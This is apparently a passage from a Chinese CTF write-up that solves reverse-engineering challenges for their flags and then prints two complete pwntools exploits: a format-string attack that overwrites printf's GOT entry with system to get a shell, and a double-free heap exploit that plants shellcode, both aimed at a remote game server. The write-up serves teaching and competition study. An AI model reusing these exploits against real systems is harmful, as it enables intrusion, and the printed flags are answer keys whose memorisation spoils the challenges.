[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0152be65446005a0bd.png)

第四小块

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c5cfe11b8ad93ad3.png)

Py

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e099c19a871d6f47.png)

 register

题目要求默认为flag`{``}`和在一起得到：

flag`{`th？_4_your_register`}`

？这里我们不知道，只能去猜

通过猜猜猜，得到

flag`{`thx_4_your_register`}`

**0x04 Reverse04**

我们还是看程序逻辑：

[![](https://p3.ssl.qhimg.com/t013800039954e58a2f.png)](https://p3.ssl.qhimg.com/t013800039954e58a2f.png)

有个伪随机，是个固定值，然后过两个函数

函数1

[![](https://p1.ssl.qhimg.com/t01e9414e13d5ca2db5.png)](https://p1.ssl.qhimg.com/t01e9414e13d5ca2db5.png)

就是个编码上的加密

函数2

[![](https://p1.ssl.qhimg.com/t0113188358a63d18c4.png)](https://p1.ssl.qhimg.com/t0113188358a63d18c4.png)

也是个编码上的加密

最后加密和“vfnlhthn__bneptls`}`xlragp`{`__vejblxpkfygz_wsktsgnv ”这个串相同就对了，这就是程序的逻辑

接着我们进行具体分析：

先看函数2

[![](https://p2.ssl.qhimg.com/t01c7c27c4f39dc2796.png)](https://p2.ssl.qhimg.com/t01c7c27c4f39dc2796.png)

里面有个rand，Gdb 调出来

V8=8,v9=6；

6*8=48 ，正好和密文数量相同！

然后看里面开始实际是一个交换

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01155b6bcddd589a76.png)

除了 `{`_`}` 这三个字符都换

函数一里面

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012ded707d698a752d.png)

第一个循环生成了一个表

第二个是 :表对应位置加上一个数

我们直接把函数二解密的结果 减去那个数

剩下就是还原表里面的数，仔细一看就是个mod26的表，这种我们把小于97的数再加26就行了!

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c3ee574edb9f3bb2.png)

脚本随手写的，解密得到结果：

flag`{`decrypt_game_is_very_very_interesting`}`

逻辑分析不难，只要把握好数据的变化，题目的答案就不远了。

<br>

**Pwn**

**0x01 Pwn1**

看了下 简单的格式化字符串

[![](https://p5.ssl.qhimg.com/t012b871c57f32cf9c4.png)](https://p5.ssl.qhimg.com/t012b871c57f32cf9c4.png)

简单分析一下吧  

Scanf 格式化的字符串直接传值在getchar()里进行判断 导致存在格式化字符串漏洞

这里贴出exp



```
#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
#switches
DEBUG = 0
LOCAL = 0
VERBOSE = 0
elf = ELF('./pwn1')
if LOCAL:
    libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
    p = process('./pwn1')#local processs
else:
    p = remote('115.28.185.220',11111)
    libc = ELF('libc32.so')
# simplified r/s function
def fms(data):
    p.recvuntil('input$')
    p.sendline('1')
    p.recvuntil('name:n')
    p.sendline(data)
# define interactive functions here
def pwn():
#leak libc_base_addr
    fms('%35$p')
    if LOCAL:
    libc_start_main_addr = int(p.recvn(10),16) - 247
    else:
    libc_start_main_addr = int(p.recvn(10),16) - 243
    libc.address = libc_start_main_addr - libc.symbols['__libc_start_main']
    print 'libc.addr =&gt; ', hex(libc.address)
    printf_got = elf.got['printf']
    print 'printf_got =&gt; ' , hex(printf_got)
#find printf_addr &amp; system_addr 
    system_addr = libc.symbols['system']
    print 'system_addr =&gt; ' , hex(system_addr)
#make stack
    make_stack = 'a' * 0x30 + p32(printf_got) + p32(printf_got + 0x1) 
    fms(make_stack)
#write system to printf
    payload = "%" + str(((system_addr &amp; 0x000000FF))) + "x%18$hhn"
    payload += "%" + str(((system_addr &amp; 0x00FFFF00) &gt;&gt; 8) - (system_addr &amp; 0x000000FF)) + "x%19$hn" 
    print payload
#get shell
    fms(payload)
    p.sendline('/bin/shx00')
    p.interactive()
# define symbols and offsets here
if __name__ == '__main__': 
    pwn()
```

**0x02 Pwn2**

同样先进行分析

[![](https://p3.ssl.qhimg.com/t016275ea714c4cfaa3.png)](https://p3.ssl.qhimg.com/t016275ea714c4cfaa3.png)

这里chunk_number能到48，但是free检测到47，释放掉一个之后 list[45]=list[46]，所以这里存在double free漏洞

这里啰嗦几句吧 这题出的还是有难度的  这里想讲自己错误的思路 然后在分析正确思路

错误思路：

没有开nx 所以bss可任意读写

将chunk_number的值设置成21，然后两次写，最后覆盖到了list，这时在create一个list，应该就能覆盖到got表了

通过fastbin该num进行覆盖 但是因为多了一个0x10会破坏掉堆

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013fb290697fd6db25.png)

认为这里存在任意读 但是发现无法利用 

若还是将chunk_number写21然后free(&amp;chunk_number-8),然后 malloc就能进行对chunk_number+8  写内容了

但是却只能写到chunk_number下面 

这里可以leak堆地址 但是却无法控制eip 导致死死地卡在这里

正确思路： 前面思路中分析的漏洞点都没有问题 所以这里不再重复 

错误的只是思路问题 和利用方式

往got上面写heap地址 然后jmp shellcode

这里也是通过该num 不过这次不是通过double free 而是通过free 一定的负下标

预先在num下面设置好的负数位移到上面的num 下次malloc的时候就可以让got

表的地址填上我们的堆地址 

需要用到shellcode 不能改got  ，跳转到got表后就会执行got表地址所处的命令

接着进行复写got 

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01ec25f41a6d006471.png)

看距list的下标是负几 不停的free 就会将写好的负数位移到num那里 再次

Mallco时 list+num处 会填写我申请到的地址

第一步 要申请到bss段 num下面的地址 在里面填上一个合适的负数

此时也可以往堆写入 预先写好的shellcode

接下里思路清晰就可以构造exp了

下面附上代码



```
from pwn import *
local = 0
slog = 0
debug = 0
if slog:context.log_level = 'debug'
context(arch='amd64')
if local and debug:
        p = process("./mistake", env=`{`"LD_PRELOAD" : "/mnt/hgfs/share/tool/libc-database/db/libc6_2.19-0ubuntu6.11_amd64.so"`}`)
else:
        p = remote('115.28.185.220',22222)#115.28.185.220 22222
libc = ELF('/mnt/hgfs/share/tool/libc-database/db/libc6_2.19-0ubuntu6.11_amd64.so')
def malloc(content):
    p.recvuntil('&gt; ')
    p.sendline('1')
    p.recvuntil('content: ')
    p.sendline(content)
def free(id):
    p.sendline('3')
    p.sendline(str(id))
def read(addr):
    p.sendline('2')
    p.recvuntil('id: ')
    addr = (addr-0x6020a0)/8
    addr = 0x100000000+addr
    p.sendline(str(addr))
def num(number):
    max = 0xffffffff
    return max + number + 1
free_got = 0x602018
chunk_49 =0x602220
list = 0x6020A0
ptr_got = 0x601f00
chunk_number = 0x0602080
one_offset = 0xe9f2d    
def pwn():
    #leak libc and one_gadget address 
    read(ptr_got)
    p.recv(32)
    write_addr = u64(p.recv(8))
    libc.address = write_addr - libc.symbols['write']
    one = libc.address + one_offset 
    log.info('write address is ' + hex(write_addr))
    log.info('libc address is ' + hex(libc.address))
    log.info('one_gadget is ' + hex(one))
    #to double free fake num
    p.send('n')
    for x  in xrange(49):
        malloc('AAAA')
    for y in xrange(16):
        free(0)
    free(32)
    free(30)
    free(30)
    malloc(p64(chunk_number-0x8))
    malloc('BBBB')
    malloc('CCCC')
    malloc(p64(num(-13)))
    payload = '''mov rax, `{``}`
                 jmp rax'''.format(one)
    shellcode = asm(payload)
    #change num to neg
    free(num(-5))
    #change malloc got
    malloc(shellcode)
    p.send('1')
pwn()
p.interactive()
```


